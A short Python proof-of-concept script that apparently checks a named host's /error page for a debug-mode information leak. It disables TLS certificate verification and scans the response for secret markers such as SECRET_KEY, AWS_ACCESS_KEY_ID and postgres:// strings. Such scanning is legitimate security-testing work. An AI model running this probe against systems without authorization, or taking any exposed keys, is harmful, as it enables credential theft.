"""
Author: Travis Eweka
Vulnerability: Debug Trace Secret Leak
Target: dev.0x10.cloud
"""

import urllib.request
import ssl

url = "https://dev.0x10.cloud/error"
context = ssl._create_unverified_context()

with urllib.request.urlopen(url, timeout=5, context=context) as response:
    body = response.read().decode("utf-8", errors="replace")

print("Requested:", url)

markers = [
    "Traceback",
    "SECRET_KEY",
    "AWS_ACCESS_KEY_ID",
    "DEBUG = True",
    "postgres://",
]
found = [marker for marker in markers if marker in body]

if found:
    print("VULNERABILITY: debug error page leaked sensitive internals")
    print("Found markers:", ", ".join(found))
else:
    print("No debug leak markers found")
